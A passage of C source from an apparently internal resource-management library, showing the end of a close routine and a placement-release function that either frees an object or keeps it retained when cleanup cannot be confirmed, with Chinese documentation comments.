            (uint64_t) impl->retained_descriptors;
        return GLK43499_CALL_SYSTEM_ERROR;
    }
    for (size_t index = 0; index < sizeof(sets) / sizeof(sets[0]); ++index) {
        glk43499_placement_free_ctx(sets[index]);
    }
    impl->state = 2;
    free(impl);
    glk43499_internal_set_close(result, GLK43499_CALL_OK,
                                GLK43499_EFFECT_CLEAN_SUCCESS,
                                GLK43499_RESOURCE_CLOSED, 0, 1, 1, 1, 0);
    return GLK43499_CALL_OK;
}

/**
 * @brief 释放 Placement 仍持有的全部资源并释放对象（内部接口）。
 * @param placement 非空对象。
 * @note 只在 close 接受后调用；landing 成功后不再调用（对象已被 landing 释放）。
 */
void glk43499_placement_release(struct glk43499_placement_impl *placement) {
    if (placement == NULL) return;
    if (glk43499_placement_cleanup_all(placement) != 0) {
        free(placement);
    } else {
        /* 清理无法证明完整：对象与身份保留到进程退出。 */
        placement->retained = 1;
    }
}
